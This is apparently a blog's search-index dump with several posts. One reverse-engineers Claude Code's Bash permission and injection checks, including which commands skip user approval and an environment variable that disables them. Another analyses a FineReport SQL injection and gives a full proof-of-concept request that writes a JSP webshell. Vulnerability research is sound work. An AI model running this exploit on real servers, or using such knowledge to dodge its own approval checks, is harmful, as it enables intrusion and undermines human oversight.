for (let Z of Q) {\n    let G = sS6(Z, B);\n    if (G.behavior !== \"passthrough\") {\n      return G;\n    }\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No mode-specific validation required\"\n  };\n}\n\n// 写操作命令列表\nvar nS6 = [\"mkdir\", \"touch\", \"rm\", \"rmdir\", \"mv\", \"cp\"];\n\nfunction aS6(A) {\n  return nS6.includes(A);\n}\n\n// 模式特定行为检查\nfunction sS6(A, B) {\n  let Q = A.trim();\n  let [Z] = Q.split(/\\s+/);\n\n  if (!Z) {\n    return {\n      behavior: \"passthrough\",\n      message: \"Base command not found\"\n    };\n  }\n\n  // acceptEdits 模式允许写操作命令\n  if (B.mode === \"acceptEdits\" && aS6(Z)) {\n    return {\n      behavior: \"allow\",\n      updatedInput: { command: A },\n      decisionReason: {\n        type: \"mode\",\n        mode: \"acceptEdits\"\n      }\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: `No mode-specific handling for '${Z}' in ${B.mode} mode`\n  };\n}\n```\n\n---\n\n## 七、只读命令检测与自动后台执行\n### 7.1 Bash 工具对象 `I9` - 核心工具定义\n**代码位置**: `deobfuscated.js:396913`\n\n```javascript\nvar I9 = {\n  name: B3,  // 工具名称（Bash）\n\n  // 工具描述\n  async description({ description: A }) {\n    return A || \"Run shell command\";\n  },\n\n  // 工具提示\n  async prompt() {\n    return _a2();\n  },\n\n  // 并发安全性检查（依赖 isReadOnly）\n  isConcurrencySafe(A) {\n    return this.isReadOnly(A);\n  },\n\n  // 只读命令检测（核心方法）\n  isReadOnly(A) {\n    let { command: B } = A;\n\n    // 1. Sandbox 模式强制为只读\n    if (\"sandbox\" in A ? !!A.sandbox : false) {\n      return true;\n    }\n\n    // 2. 命令注入检测必须通过\n    if (Rx(B).behavior !== \"passthrough\") {\n      return false;\n    }\n\n    // 3. 检查所有子命令是否在安全白名单中\n    return PU(B).every(Z => {\n      // 3.1 每个子命令都必须通过命令注入检测\n      if (Rx(Z).behavior !== \"passthrough\") {\n        return false;\n      }\n      // 3.2 每个子命令都必须在安全白名单中\n      return Hj6(Z);\n    });\n  },\n\n  // 输入模式定义\n  inputSchema: Xj1() ? Ij6 : Z1B,\n\n  // 用户可见名称\n  userFacingName(A) {\n    if (!A) {\n      return \"Bash\";\n    }\n    if (\"sandbox\" in A ? !!A.sandbox : false) {\n      return \"SandboxedBash\";\n    } else {\n      return \"Bash\";\n    }\n  },\n\n  // 工具是否启用\n  isEnabled() {\n    return true;\n  },\n\n  // 权限检查入口\n  async checkPermissions(A, B) {\n    // Sandbox 模式直接允许\n    if (\"sandbox\" in A ? !!A.sandbox : false) {\n      return {\n        behavior: \"allow\",\n        updatedInput: A\n      };\n    }\n    // 调用主检测函数\n    return mH0(A, B);\n  },\n\n  // 渲染工具使用消息\n  renderToolUseMessage(A, { verbose: B }) {\n    // ... 渲染逻辑\n  }\n};\n```\n\n---\n\n### 7.2 只读检测机制详解\n#### 7.2.1 `isReadOnly()` 的判断逻辑\n| 判断条件 | 说明 | 代码位置 |\n| --- | --- | --- |\n| **Sandbox 模式** | 所有 sandbox 命令都视为只读 | 396930-396932 |\n| **命令注入检测** | 整体命令必须通过 `Rx()` 检测 | 396933-396935 |\n| **子命令检查** | 每个子命令都必须：   1. 通过 `Rx()` 检测   2. 在安全白名单中 | 396936-396941 |\n\n\n#### 7.2.2 只读命令的特权\n只读命令 (`isReadOnly() === true`) 享有以下特权：\n\n1. **自动允许**: 在 `te2()` 函数中，只读命令可能被自动允许（代码位置: 396591-396599）\n2. **并发执行**: `isConcurrencySafe()` 返回 true，可与其他操作并发执行（代码位置: 396923-396925）\n3. **无需批准**: 在某些模式下可能绕过用户批准\n\n---\n\n### 7.3 白名单检测函数 `Hj6()`\n**代码位置**: `deobfuscated.js:396887`\n\n```javascript\nfunction Hj6(A) {\n  // A: 命令字符串\n\n  let B = A.trim();\n\n  // 步骤 1: 移除标准的 stderr 重定向\n  if (B.endsWith(\" 2>&1\")) {\n    B = B.slice(0, -5).trim();\n  }\n\n  // 步骤 2: 检查命令是否匹配白名单中的任何正则表达式\n  for (let Q of Vj6) {\n    if (Q.test(B)) {\n      // 特殊处理: git -c 被排除\n      // 因为 git -c 可以执行任意配置命令\n      if (B.includes(\"git\") && /\\s-c[\\s=]/.test(B)) {\n        return false;\n      }\n      return true;  // 命令在白名单中\n    }\n  }\n\n  return false;  // 命令不在白名单中\n}\n```\n\n#### 7.3.1 `Hj6()` 的调用位置\n| 调用位置 | 调用函数 | 作用 |\n| --- | --- | --- |\n| 396940 | `I9.isReadOnly()` | 判断命令是否只读 |\n| 其他可能的调用 | - | - |\n\n\n#### 7.3.2 `Hj6()` 与白名单的关系\n`Hj6()` 是白名单 `Vj6` 的检测函数，它：\n\n1. **预处理命令**: 移除 `2>&1` 等标准重定向\n2. **匹配正则**: 遍历 `Vj6` 中的所有正则表达式\n3. **特殊排除**: 排除 `git -c` 等危险模式\n\n---\n\n### 7.4 自动后台执行检测 `Dj6()`\n**代码位置**: `deobfuscated.js:396902`\n\n```javascript\nfunction Dj6(A) {\n  // A: 命令字符串\n\n  // 步骤 1: 分割命令\n  let B = PU(A);\n\n  // 步骤 2: 空命令默认可后台执行\n  if (B.length === 0) {\n    return true;\n  }\n\n  // 步骤 3: 提取第一个命令\n  let Q = B[0]?.trim();\n  if (!Q) {\n    return true;\n  }\n\n  // 步骤 4: 检查是否在禁止后台执行的列表中\n  return !Yj6.includes(Q);\n}\n```\n\n#### 7.4.1 禁止后台执行的命令列表\n**代码位置**: `deobfuscated.js:396802`\n\n```javascript\nvar Yj6 = [\"sleep\"];\n```\n\n目前只有 `sleep` 命令被禁止自动后台执行，因为：\n\n+ `sleep` 命令会阻塞等待，不适合后台执行\n+ 可能导致用户误以为命令已完成\n\n#### 7.4.2 `Dj6()` 的调用位置\n**代码位置**: `deobfuscated.js:397275`\n\n```javascript\n// 在命令执行器中\nlet w = z.result;  // 命令执行结果\n\n// 如果用户请求后台执行 && 命令可以后台执行\nif (W === true && Dj6(G)) {\n  H = yH0(G, z);  // 创建后台任务\n  let M = B1B(G);  // 获取命令类型\n  X1(\"tengu_bash_command_auto_backgrounded\", {\n    command_type: M\n  });\n\n  // 立即返回，不等待命令完成\n  return {\n    stdout: \"\",\n    stderr: \"\",\n    code: 0,\n    interrupted: false,\n    backgroundTaskId: H  // 返回后台任务 ID\n  };\n}\n```\n\n#### 7.4.3 自动后台执行的条件\n| 条件 | 说明 |\n| --- | --- |\n| **用户请求** | `run_in_background: true` |\n| **命令允许** | `Dj6(command) === true` |\n| **非 sleep** | 命令不是 `sleep` |\n\n\n---\n\n### 7.5 白名单正则生成器 `Xj6()`\n**代码位置**: `deobfuscated.js:396866`\n\n```javascript\nfunction Xj6(A) {\n  // A: 命令名称（如 \"date\", \"ls\"）\n\n  // 生成正则: /^命令名(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/\n  return new RegExp(`^${A}(?:\\\\s|$)[^<>()$\\`|{}&;\\\\n\\\\r]*$`);\n}\n```\n\n#### 7.5.1 生成的正则模式解释\n以 `Xj6(\"ls\")` 为例，生成的正则为：\n\n```plain\n/^ls(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/\n```\n\n匹配规则：\n\n+ `^ls` - 以 `ls` 开头\n+ `(?:\\s|$)` - 后跟空格或行尾\n+ `[^<>()$`|{}&;\\n\\r]*` - 不包含危险字符\n+ `$` - 行尾\n\n这意味着：\n\n+ ✅ `ls` - 匹配\n+ ✅ `ls -la` - 匹配\n+ ✅ `ls /tmp` - 匹配\n+ ❌ `ls | grep foo` - 不匹配（包含 `|`）\n+ ❌ `ls; echo foo` - 不匹配（包含 `;`）\n+ ❌ `ls && rm file` - 不匹配（包含 `&`）\n\n---\n\n### 7.6 完整的只读检测流程图\n![2283734683728374.png](/resources/2283734683728374.png)\n---\n\n### 7.7 只读命令的使用场景\n#### 7.7.1 在 `te2()` 函数中的应用\n**代码位置**: `deobfuscated.js:396591-396599`\n\n```javascript\nvar te2 = (A, B) => {\n  // ... 其他检查\n\n  // 步骤 5: 只读命令自动允许\n  if (I9.isReadOnly(A)) {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"other\",\n        reason: \"Read-only command is allowed\"\n      }\n    };\n  }\n\n  // ... 继续其他检查\n};\n```\n\n#### 7.7.2 在管道处理 `xS6()` 中的应用\n**代码位置**: `deobfuscated.js:395930-395932`\n\n```javascript\nasync function xS6(A, B, Q, Z, G) {\n  // ... 管道左边的命令检查\n\n  // 检查管道右边的命令是否为只读命令\n  let W = mK0(Q).every(D => {\n    return I9.isReadOnly({ ...A, command: D.trim() });\n  });\n\n  // 根据只读性质决定行为\n  let F = W\n    ? { behavior: \"allow\", ... }  // 只读命令，允许\n    : { behavior: \"ask\", ... };   // 非只读，需要询问\n}\n```\n\n---\n\n### 7.8 Sandbox 模式的特殊处理\n#### 7.8.1 Sandbox 模式的定义\n**代码位置**: `deobfuscated.js:396820-396822`\n\n```javascript\nvar Ij6 = Z1B.extend({\n  sandbox: f.boolean().optional().describe(\n    \"whether to run this command in sandboxed mode: \" +\n    \"command run in this mode may not write to the filesystem or use the network, \" +\n    \"but they can read files, analyze data, and report back to you. \" +\n    \"When possible, run commands (e.g. grep) in this mode to present a smoother experience \" +\n    \"for the human, who isn't prompted to approve commands run in sandbox mode. \" +\n    \"If you run a command in sandbox mode and it looks like it fails because it needs \" +\n    \"write access after all, try again in non-sandbox mode\"\n  )\n});\n```\n\n#### 7.8.2 Sandbox 模式的特权\n| 特权 | 说明 | 代码位置 |\n| --- | --- | --- |\n| **强制只读** | 所有 sandbox 命令都视为只读 | 396930-396932 |\n| **直接允许** | `checkPermissions()` 直接返回 allow | 396958-396963 |\n| **无需批准** | 用户不会被提示批准 sandbox 命令 | - |\n\n\n---\n\n### 7.9 总结：只读命令与白名单的关系\n| 概念 | 作用 | 判断标准 |\n| --- | --- | --- |\n| **只读命令** | 判断命令是否可以自动允许、并发执行 | 1. Sandbox 模式   2. 通过 `Rx()` 检测   3. 在白名单中 |\n| **白名单** ****`Vj6`**** | 预定义的安全命令集合 | 50+ 条正则表达式 |\n| ****`Hj6()`**** | 白名单检测函数 | 检查命令是否匹配 `Vj6` |\n| ****`Dj6()`**** | 自动后台执行检测 | 命令不是 `sleep` |\n| ****`isReadOnly()`**** | 只读判断主函数 | 综合上述所有条件 |\n\n\n---\n\n## 八、命令解析辅助函数\n### 8.1 命令分割函数 `PU()`\n**代码位置**: `deobfuscated.js:392105`\n\n```javascript\nfunction PU(A) {\n  // A: 命令字符串\n\n  // 使用 shell-quote 库解析命令\n  let B = uK0(A);\n\n  for (let Z = 0; Z < B.length; Z++) {\n    let G = B[Z];\n    if (G === undefined) {\n      continue;\n    }\n\n    // 过滤 shell 操作符\n    if (RL6.has(G)) {  // RL6 = new Set([\"&&\", \"||\", \";\", \";;\", \"|\", \">&\", \">\"])\n      continue;\n    }\n\n    // 处理 glob 模式\n    if (typeof G === \"object\" && G !== null && \"op\" in G && G.op === \"glob\") {\n      B[Z] = G.pattern;\n    }\n  }\n\n  // 移除操作符后的命令列表\n  return mK0(Q);  // mK0 = 过滤操作符\n}\n\n// Shell 操作符集合\nvar or2 = new Set([\"&&\", \"||\", \";\", \";;\", \"|\"]);\nvar RL6 = new Set([...or2, \">&\", \">\"]);\n\n// 命令解析函数\nfunction uK0(A) {\n  let B = [];\n  try {\n    // 替换引号为占位符，避免解析问题\n    for (let G of gK0.parse(\n      A.replaceAll(\"\\\"\", `\"${hK0}`)  // hK0 = \"__DOUBLE_QUOTE__\"\n         .replaceAll(\"'\", `'${fK0}`) // fK0 = \"__SINGLE_QUOTE__\"\n         .replaceAll(\"\\n\", `\\n${bK0}\\n`), // bK0 = \"__NEW_LINE__\"\n      Y => `$${Y}`  // 替换变量为 $N 形式\n    )) {\n      if (typeof G === \"string\") {\n        // 合并连续的字符串\n        if (B.length > 0 && typeof B[B.length - 1] === \"string\") {\n          if (G === bK0) {\n            B.push(null);  // 换行符\n          } else {\n            B[B.length - 1] += \" \" + G;\n          }\n          continue;\n        }\n      }\n\n      // 处理 glob 模式\n      else if (\"op\" in G && G.op === \"glob\") {\n        if (B.length > 0 && typeof B[B.length - 1] === \"string\") {\n          B[B.length - 1] += \" \" + G.pattern;\n        }\n      }\n\n      B.push(G);\n    }\n  } catch (H) {\n    // 解析失败，返回原始命令\n    return [A];\n  }\n\n  return B;\n}\n```\n\n---\n\n### 8.2 多命令检测 `tr2()`\n**代码位置**: `deobfuscated.js:392333`\n\n```javascript\nfunction tr2(A) {\n  // A: 命令字符串\n\n  // 检测: 多个命令 && 不是简单的管道或重定向\n  return PU(A).length > 1 && !OL6(A);\n}\n\n// 检查是否为简单的管道或重定向\nfunction OL6(A) {\n  let B = gK0.parse(\n    A.replaceAll(\"\\\"\", `\"${hK0}`)\n     .replaceAll(\"'\", `'${fK0}`),\n    Q => `$${Q}`\n  );\n\n  for (let Q = 0; Q < B.length; Q++) {\n    let Z = B[Q];\n\n    // 只包含管道和重定向操作符\n    if (typeof Z === \"object\" && Z !== null && \"op\" in Z) {\n      if (![\"|\", \">\", \">&\", \"<\", \">>\"].includes(Z.op)) {\n        return false;\n      }\n    }\n  }\n\n  return true;\n}\n```\n\n---\n\n## 九、环境变量控制\n### 9.1 禁用命令注入检测\n**代码位置**: `deobfuscated.js:396621`\n\n```javascript\n// 检查环境变量是否禁用了命令注入检测\nif (!Q9(process.env.CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK)) {\n  let I = Rx(A.command);  // 执行命令注入检测\n\n  // 如果检测到注入或外部标记了注入\n  if (Q?.commandInjectionDetected || I.behavior !== \"passthrough\") {\n    let W = {\n      type: \"other\",\n      reason: I.behavior === \"ask\" && I.message\n        ? I.message\n        : \"This command contains patterns that could pose security risks and requires approval\"\n    };\n    return {\n      behavior: \"ask\",\n      message: pF(B, I9.name, W),\n      decisionReason: W\n    };\n  }\n}\n\n// Q9() = 布尔转换函数（类似 !!value）\n```\n\n**警告**: 在生产环境**不要**设置 `CLAUUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK` 环境变量！\n\n---\n\n## 十、总结\n### 10.1 检测层次\nClaude Code 采用**多层防御策略**：\n\n```plain\n第 1 层: 用户配置规则\n  ├─ 精确匹配 (exact)\n  └─ 前缀匹配 (prefix)\n\n第 2 层: 命令模式匹配\n  ├─ 安全命令白名单 (Vj6)\n  └─ 只读命令检测\n\n第 3 层: 路径验证\n  ├─ 受限命令路径检查 (cd, ls, find, ...)\n  └─ 允许目录验证\n\n第 4 层: 命令注入检测\n  ├─ 危险模式检测 (FL6)\n  ├─ 命令替换检测 (``, $(), ${})\n  ├─ 重定向检测 (<, >)\n  ├─ 管道检测 (|)\n  ├─ 换行符检测\n  └─ Heredoc 检测\n\n第 5 层: 多命令检查\n  ├─ 子命令递归检测\n  ├─ 管道命令特殊处理\n  └─ 多目录切换检测\n```\n\n### 10.2 关键安全特性\n| 特性 | 说明 | 代码位置 |\n| --- | --- | --- |\n| **白名单机制** | 预定义的安全命令正则表达式列表 | `Vj6` (396870) |\n| **命令解析** | 使用 shell-quote 库正确解析命令 | `PU()` (392105) |\n| **模式检测** | 检测命令替换、重定向、管道等危险模式 | `Rx()` (392010) |\n| **路径限制** | 对特定命令进行路径验证 | `cS6()` (396290) |\n| **行为分级** | allow/deny/ask/passthrough 四级行为系统 | 各检测函数 |\n| **可配置性** | 支持用户自定义规则和模式 | `oe2()` (396478) |\n\n\n### 10.3 安全建议\n1. **不要**在生产环境设置 `CLAUUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK`\n2. **审查**用户的 `alwaysAllowRules` 配置，避免过度放权\n3. **关注** `ask` 行为的命令和原因\n4. **限制**写操作命令的路径访问权限\n5. **监控** `bypassPermissions` 模式的使用\n6. **定期**审查权限规则，清理不再需要的规则\n\n---\n\n## 附录：代码位置索引\n| 函数名 | 功能 | 代码位置 |\n| --- | --- | --- |\n| `mH0()` | 主检测函数（异步） | 396644 |\n| `uH0()` | 用户规则精确匹配 | 396491 |\n| `te2()` | 前缀匹配和路径验证 | 396539 |\n| `re2()` | 最终决策函数 | 396612 |\n| `oe2()` | 规则匹配辅助 | 396478 |\n| `fH0()` | 规则过滤 | 396461 |\n| `de2()` | 管道操作检测 | 396024 |\n| `xS6()` | 管道命令处理 | 395965 |\n| `Rx()` | 命令注入检测核心 | 392010 |\n| `PU()` | 命令分割 | 392105 |\n| `uK0()` | 命令解析 | 392051 |\n| `VL6()` | 引号处理 | 391579 |\n| `KL6()` | 清理重定向符 | 391629 |\n| `HL6()` | 空命令检测 | 391632 |\n| `DL6()` | 命令完整性检测 | 391650 |\n| `CL6()` | Heredoc 检测 | 391731 |\n| `zL6()` | Heredoc 安全检查 | 391678 |\n| `UL6()` | Git Commit 检测 | 391758 |\n| `EL6()` | 安全 Heredoc 检测 | 391800 |\n| `$L6()` | jq 命令检测 | 391829 |\n| `ML6()` | 混淆标志检测 | 391955 |\n| `wL6()` | Find 元字符检测 | 391858 |\n| `qL6()` | 危险变量检测 | 391886 |\n| `LL6()` | 换行符检测 | 391934 |\n| `NL6()` | 危险模式检测 | 391901 |\n| `I9` | Bash 工具对象定义 | 396913 |\n| `I9.isReadOnly()` | 只读命令检测 | 396926 |\n| `I9.isConcurrencySafe()` | 并发安全性检查 | 396923 |\n| `I9.checkPermissions()` | 权限检查入口 | 396957 |\n| `Hj6()` | 白名单检测函数 | 396887 |\n| `Dj6()` | 自动后台执行检测 | 396902 |\n| `Xj6()` | 白名单正则生成器 | 396866 |\n| `Yj6` | 禁止后台执行命令列表 | 396802 |\n| `Fj6` | 基础安全命令列表 | 396869 |\n| `cS6()` | 路径验证主函数 | 396290 |\n| `lS6()` | 路径验证包装器 | 396312 |\n| `iS6()` | 路径提取和验证 | 396343 |\n| `pS6()` | 路径提取 | 396331 |\n| `gS6()` | 路径解析 | 396100 |\n| `ae2()` | 路径验证调用 | 396360 |\n| `se2()` | 模式特定行为验证 | 396403 |\n| `sS6()` | 子命令模式检查 | 396377 |\n| `ne2` | 路径提取函数集合 | 396145 |\n| `FL6` | 危险模式列表 | 391557 |\n| `Vj6` | 安全命令白名单 | 396870 |\n| `dS6` | 路受限命令操作类型 | 396259 |\n| `uS6` | 受限命令列表 | 396227 |\n| `nS6` | 写操作命令列表 | 396373 |\n| `y3()` | 过滤标志参数 | 396114 |\n| `ce2()` | 提取非标志参数 | 396115 |\n| `tr2()` | 多命令检测 | 392333 |\n| `OL6()` | 简单管道检测 | 392297 |\n\n\n---\n\n**报告生成时间**: 2025-12-30  \n**分析版本**: Claude Code 1.0.92  \n**反编译文件**: `decompiled_1.0.92/deobfuscated.js`\n\n‍\n\n","tags":["AI安全","Claude Code","JavaScript"],"categories":["AI安全","架构分析"]},{"title":"测试图片显示","url":"/2025/12/31/test-image/","content":"\n这是一个测试图片显示的文章。\n\n![测试图片1](/resources/13464947a8d54db7b6323cc805ecea78.png)\n\n测试完成。\n","tags":["test"],"categories":["测试"]},{"title":"加密测试文章","url":"/2025/12/30/encrypted-test-post/","content":"\n# 这是加密文章的内容\n\n恭喜你成功解密了这篇文章！\n\n## 加密功能测试\n\n这篇文章用于测试 hexo-blog-encrypt 插件的加密功能。\n\n### 功能特点\n\n1. 文章内容在未输入正确密码前不可见\n2. 密码输入界面与暗色主题风格一致\n3. 在文章列表中显示加密标识图标\n4. 支持会话级别的密码记忆\n\n### 代码示例\n\n```javascript\n// 这是一段测试代码\nfunction secretFunction() {\n  console.log('这是加密内容中的代码');\n  return 'secret';\n}\n```\n\n### 结语\n\n如果你能看到这些内容，说明加密和解密功能正常工作！\n","tags":["加密","测试"],"categories":["测试"]},{"title":"Web Security Best Practices","url":"/2025/12/27/web-security-best-practices/","content":"\nEssential security practices every web developer should follow.\n\n## Input Validation\n\nAlways validate and sanitize user input:\n\n```javascript\n// Bad - vulnerable to XSS\nfunction displayUserInput(input) {\n  document.getElementById('output').innerHTML = input;\n}\n\n// Good - sanitize input\nfunction displayUserInput(input) {\n  const sanitized = input\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n  document.getElementById('output').textContent = sanitized;\n}\n```\n\n## SQL Injection Prevention\n\nUse parameterized queries:\n\n```python\n# Bad - vulnerable to SQL injection\ndef get_user(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    return db.execute(query)\n\n# Good - use parameterized queries\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = ?\"\n    return db.execute(query, (username,))\n```\n\n## Password Security\n\nHash passwords properly:\n\n```python\nimport bcrypt\n\n# Hashing a password\ndef hash_password(password):\n    salt = bcrypt.gensalt()\n    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n    return hashed\n\n# Verifying a password\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode('utf-8'), hashed)\n```\n\n## HTTPS and Secure Headers\n\nAlways use HTTPS and set security headers:\n\n```javascript\n// Express.js example\nconst helmet = require('helmet');\napp.use(helmet());\n\n// Set custom headers\napp.use((req, res, next) => {\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  next();\n});\n```\n\n## CSRF Protection\n\nImplement CSRF tokens:\n\n```javascript\n// Generate CSRF token\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/process', csrfProtection, (req, res) => {\n  // Process form\n});\n```\n\nSecurity is not optional - make it a priority from day one!\n","tags":["Security","Best Practices","Web Development"],"categories":["Security","Web Development"]},{"title":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞","url":"/2025/12/20/帆软FineReport-Export-excel-未授权SQL注入致远程代码执行漏洞/","content":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞\n\n官方给的接口是 export/excel，且说了问题出在 LargedsExcelExport 这个模块里，帆软v11 web 端架构并不复杂，可通过注解 `@RequestMapping` 快速锁定相关路由。用 Jadx 搜一下，发现大部分路由都位于`com.fr.nx.app.web.controller.NXController`。\n\n<img src=\"/resources/13464947a8d54db7b6323cc805ecea78.png\" alt=\"d1986651344e1a603a92f8f2e9e23c27.png\" width=\"774\" height=\"306\">\n\n跟进到`com.fr.nx.app.web.controller.NXController#largedsExcelExportV9`，重点关注初始化方法`initCreator`。\n\n![254aa8d33b3366955492da97c3569b2d.png](/resources/e0a12bf8ed824dc0ba2a1b45bd39f56c.png)\n\n首先获取一个参数`__parameters__`，这个参数不关键，默认为{}。\n\n之后会进入`getEntity`方法，该方法需要读取第二个参数`params`，然后通过`createXMLableReader`方法自定义一个xml格式数据来还原对象。\n\n<img src=\"/resources/180b13b91af64bfc898e36a8fa084513.png\" alt=\"feb5184c9bc7bbb32f4c56a958ee4be4.png\" width=\"731\" height=\"263\">\n\n仿照其构造一个，格式如下：\n\n![bbc6cf5ded3f8b6edb4ded56d0a1cf54.png](/resources/01d3b5d50727422699e76a99b85ba49e.png)\n\n回到`getEntity`方法，程序继续执行会进入`dealParam`。\n\n![10d1648b0baf4743d18336b64b699916.png](/resources/0b164bd922534eea80ecc92882c5cf6a.png)\n\n这里需要第三个参数`functionParams`，同样默认为json。这里着重注意下，传入的`LargeDatasetExcelExportJavaScript`类型变量获取了其中`<Parameters>`下的每一个`<Parameter>`，执行了`var25 = var2.evalValue(String.valueOf(var17.getValue()));`操作。\n\n这个方法不是第一次爆洞了，简单来说就是其中可以执行帆软定义的一些函数。而帆软报表默认使用Sqlite作为数据库引擎，并且默认存在数据库FRDemo，因此可以执行SQL语句。\n\n![c53fdfe0f633ce998219e4208191c8d5.png](/resources/663baf5273c3433f8630f63aadd301b7.png)\n\n在执行SQL前，会调用`JDBCSecurityChecker.checkQuery`方法对SQL进行安全检查。跟进`checkQuery`方法，该方法做了一个黑名单检测，如果匹配到`InsecurityElement`对应的关键字，则报错退出。\n\n![24914a06c571d240990bf19d4cdcc311.png](/resources/6a962ebb2b14418b95342155cac2086f.png)\n\n也就是说，现在需要绕过SQL安全检测限制并实现webshell落地，目前已知可用的SQL注入路径如下：（由于默认的数据库里数据太多写入的shell无法解析，所以我们要先清空FRDemo数据库）：\n\n```sql\nPRAGMA writable_schema=ON;\nDELETE FROM sqlite_schema WHERE name='sqlite_stat1';\nANALYZE;\nREPLACE INTO sqlite_stat1 VALUES ('', '<JSP_PAYLOAD>', '');\nVACUUM INTO (ENV_HOME/../../92ccC9AC.jsp);\n```\n\nPOC如下：\n\n```\nGET /webroot/ReportServer?viewlets=[{'reportlet':'/'}] HTTP/1.1\nHost: 10.211.55.3:8075\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nop: getSessionID\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n\n```\n\n```\nGET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/1.1\nHost: 10.211.55.3:8075\nAccept-Encoding: gzip, deflate\nAccept: */*\nsessionID: 118b5fb1-596e-45cb-93b0-692ceb30641e\nparams: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27%3C%25+out.println%28new+String%28new+sun.misc.BASE64Decoder%28%29.decodeBuffer%28%5C%22Zjc5NjUxODQ4NDAyY2JmZmI3MWNmNGMwYWYyNzU0NzE%3D%5C%22%29%29%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E%22%2C%22%27%22%2C%22%2C%27%27%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%2292ccC9AC%22%2C%22.%22%2C%22j%22%2C%22s%22%2C%22p%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E\n```\n\n![abf87ef9964f396b3ab50677399b690e.png](/resources/e8c4e39e2c6b44f2a21c70dda2db8f17.png)","tags":["vulnerability","Java"],"categories":["漏洞分析"]},{"title":"反序列化漏洞审计流程","url":"/2025/11/13/反序列化漏洞审计流程/","content":"\n## 一、分析补丁\n\n确定url、初步分析改动代码、确定所在服务和端口（越来越多的漏洞出现在非web端口上，这种漏洞往往更不容易被挖出来。）\n\n## 二、整理源码\n\n把所有jar包都搞到一个文件夹里再添加为库。如果需要文本搜索尽量用jadx，不要用idea。\n\n资源文件收集（properties、xml、META-INF等）\n\n整理路由（[https://github.com/ax1sX/RouteCheck-Alpha）](https://github.com/ax1sX/RouteCheck-Alpha%EF%BC%89)\n\n## 三、入口点\n\n**信息收集：io.github.classgraph**\n\n入口点往往与路由绑定，如果未绑定且补丁中无法跟踪到真实入口点，则通过上面工具查找HttpServlet的实现类。\n\n## 四、序列化\n\n`java.io.Externalizable`和`java.io.Serializable`两个主要的序列化接口\n\n`readExternal`和`readObject`两个主要的反序列化方法\n\n组件往往有自己的反序列化方式，需要根据代码自己构建序列号数据。\n\n## 五、Gadget\n\n根据依赖去查询可能存在的Gadget，例如Commons-Collections、xbean、Commons-BeanUtils、Fastjson、Xstream、spring-beans、hessian等等等等。\n\n如果项目完全没有引入高危依赖，也不能说明一定不受反序列化漏洞的影响，如果确定有漏洞，则应该着重从JDK自带的gadget入手。\n\n- `javax.management.BadAttributeValueExpException`\n\n- `sun.rmi.*`\n\n- `java.util.PriorityQueue`\n\n- 